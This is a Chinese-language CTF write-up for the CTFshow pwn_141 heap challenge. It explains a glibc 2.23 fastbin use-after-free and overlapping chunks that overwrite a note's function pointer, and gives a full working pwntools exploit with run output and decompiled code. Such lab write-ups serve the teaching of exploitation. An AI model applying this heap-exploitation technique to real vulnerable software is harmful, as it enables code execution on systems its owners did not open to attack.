# CTFshow-pwn_141
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 堆利用（fastbin-UAF）
## 解题思路
> 堆块重叠修改 chunk 中的函数指针

仅没有 PIE 保护，本地libc使用 2.23-0ubuntu11.3_i386
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ ./pwn_141
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-2.23.so ./pwn_141
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_141
[*] '/home/mrw/CTFshow/pwn_141'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8044000)
    RUNPATH:    b'/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```


从伪代码分析，申请 note 时，会先申请一个长度为 16 (prev_size 的4字节 与 size 的4字节 再加上用户空间的8字节) 头部chunk并将其地址置于 bss 段的 notelist 数组中，接下来将 print_note_content 函数的函数指针置于头部 chunk 用户空间的前4个字节，再申请一个用户空间长度受用户控制的内容 chunk 并向其写入可以小于长度的内容，最后将内容 chunk 地址置于头部 chunk 用户空间后4字节。删除 note 时先删除内容 chunk 再删除头部 chunk但却没有将数组中指针置0造成 UAF  
由于未开启 PIE 且题目中存在直接输出 flag 的函数 use，可以通过堆块重叠修改某个头部指针的函数指针  
连续两次申请用户空间长度小于0x80长度且长度与头部 chunk **不相等**的内容 chunk，将其释放，此时根据glibc-2.23中的机制这两个 note 的头部 chunk 和内容 chunk 会因 长度不同而分配到两个不同的 fastbin 链中。再申请长度与头部 chunk **相等**的内容 chunk ，则根据 fastbin 所依靠的“后进先出”原则，后释放的 note 头部 chunk 成为第三个 note 的头部 chunk，而先释放的 note 头部 chunk 成为第三个 note 的内容 chunk，从而制造重叠堆块，接下来将 use 函数的地址作为内容在申请第三个 note 时传入即可通过覆盖第三个 note 的内容 chunk （也是第一个申请的 note 的 头部 chunk）的用户空间前4字节，从而修改第一个申请的 note 的 头部 chunk 中的函数指针。最后打印第一个 note 即可触发 use 函数完成利用    

**exp 如下**  
```python
from pwn import *
context(arch = 'i386')
p = process('./pwn_141')
# 与程序沟通
def add_note(siz, content):
  p.sendafter(b'choice :', b'1')
  p.sendafter(b'Note size :', str(siz).encode())
  p.sendafter(b'Content :', content)

def del_note(index):
  p.sendafter(b'choice :', b'2')
  p.sendafter(b'Index :', str(index).encode())

def print_note(index):
  p.sendafter(b'choice :', b'3')
  p.sendafter(b'Index :', str(index).encode())

add_note(0x10, b'aaaa') # 申请内容 chunk 总长为0x18的 note 0
add_note(0x10, b'bbbb') # 申请内容 chunk 总长为0x18的 note 1
del_note(0) # 删除 note 0
del_note(1) # 删除 note 1
add_note(0x8, p32(0x08049684)) # 覆盖 note 0 的函数指针为 use 的地址 0x08049684
print_note(0) # 打印 note 0 调用 use()
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ vim ./exp/pwn_141.py
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_141.py
[+] Starting local process './pwn_141': pid 7671
[*] Switching to interactive mode
flag{Success!}
-------------------------
       CTFshowNote       
-------------------------
    1. Add note          
    2. Delete note       
    3. Print note        
    4. Exit              
-------------------------
choice :$  

```

## 反编译后伪代码中有用的部分

反编译得到的有用的伪代码如下  
```c
unsigned int add_note() // 添加堆块
{
  int v0; // esi
  int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf[8]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !*((_DWORD *)&notelist + i) )
      {
        *((_DWORD *)&notelist + i) = malloc(8u);
        if ( !*((_DWORD *)&notelist + i) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        **((_DWORD **)&notelist + i) = print_note_content;
        printf("Note size :");
        read(0, buf, 8u);
        size = atoi(buf);
        v0 = *((_DWORD *)&notelist + i);
        *(_DWORD *)(v0 + 4) = malloc(size);
        if ( !*(_DWORD *)(*((_DWORD *)&notelist + i) + 4) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *(void **)(*((_DWORD *)&notelist + i) + 4), size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full!");
  }
  return __readgsdword(0x14u) ^ v5;
}
unsigned int del_note() // 删除堆块，存在 UAF
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_DWORD *)&notelist + v1) )
  {
    free(*(void **)(*((_DWORD *)&notelist + v1) + 4));
    free(*((void **)&notelist + v1));
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
unsigned int print_note() // 调用函数指针打印堆块
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_DWORD *)&notelist + v1) )
    (**((void (__cdecl ***)(_DWORD))&notelist + v1))(*((_DWORD *)&notelist + v1));
  return __readgsdword(0x14u) ^ v3;
}
int use() // 漏洞利用方式
{
  return system("cat /ctfshow_flag");
}
int menu() // 菜单
{
  puts("-------------------------");
  puts("       CTFshowNote       ");
  puts("-------------------------");
  puts("    1. Add note          ");
  puts("    2. Delete note       ");
  puts("    3. Print note        ");
  puts("    4. Exit              ");
  puts("-------------------------");
  return printf("choice :");
}
int __cdecl __noreturn main(int argc, const char **argv, const char **envp) //主函数
{
  int v3; // eax
  char buf[4]; // [esp+0h] [ebp-10h] BYREF
  unsigned int v5; // [esp+4h] [ebp-Ch]
  int *p_argc; // [esp+8h] [ebp-8h]

  p_argc = &argc;
  v5 = __readgsdword(0x14u);
  init();
  logo();
  while ( 1 )
  {
    menu();
    read(0, buf, 4u);
    v3 = atoi(buf);
    if ( v3 == 4 )
      exit(0);
    if ( v3 > 4 )
    {
LABEL_12:
      puts("Invalid choice!");
    }
    else
    {
      switch ( v3 )
      {
        case 3:
          print_note();
          break;
        case 1:
          add_note();
          break;
        case 2:
          del_note();
          break;
        default:
          goto LABEL_12;
      }
    }
  }
}
```
